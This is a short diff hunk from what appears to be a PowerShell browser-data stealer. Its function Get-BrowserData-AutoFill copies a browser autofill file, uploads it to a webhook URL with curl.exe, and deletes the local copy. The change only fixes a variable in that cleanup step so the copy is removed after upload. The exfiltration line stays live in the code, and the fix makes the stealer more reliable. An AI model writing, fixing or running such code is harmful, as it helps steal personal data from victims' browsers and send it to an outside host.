@@ -107,13 +107,15 @@ function Get-BrowserData-AutoFill {
         if ($Path -and (Test-Path -Path $Path)) {
             Copy-Item -Path $Path -Destination $destinationFilePath
             curl.exe -s -S -F "file1=@$destinationFilePath" $WebhookUrl | Out-Null
-            if (Test-Path $wavFilePath) {
+            # Corrected check to see if $destinationFilePath exists before attempting to remove it
+            if (Test-Path $destinationFilePath) {
                 Remove-Item -Path $destinationFilePath -Force | Out-Null
             }
         } else {
         }
     }
 }
+
 
 function Get-BrowserData {
     [CmdletBinding()]
